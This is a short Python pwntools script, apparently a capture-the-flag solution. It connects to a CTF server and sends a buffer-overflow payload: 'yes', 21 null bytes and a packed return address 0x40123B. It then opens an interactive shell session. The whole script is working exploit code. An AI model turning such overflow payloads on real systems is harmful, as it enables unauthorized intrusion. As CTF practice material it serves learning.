#!python3
from pwn import *

r = remote("ctf.adl.tw", 10000)

r.recvuntil("Do you like VTuber?")
r.sendline(flat("yes", "\0" * 21, p64(0x40123B)))

r.interactive()
